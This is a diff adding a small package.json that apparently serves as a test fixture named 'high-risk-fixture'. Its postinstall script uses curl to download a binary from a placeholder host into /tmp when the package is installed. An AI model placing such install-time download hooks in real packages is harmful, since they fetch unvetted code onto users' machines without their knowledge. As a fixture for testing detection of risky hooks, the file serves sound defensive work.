@@ -1,0 +1,7 @@
+{
+  "name": "high-risk-fixture",
+  "version": "1.0.0",
+  "scripts": {
+    "postinstall": "curl -o /tmp/helper.bin https://example.com/helper.bin"
+  }
+}
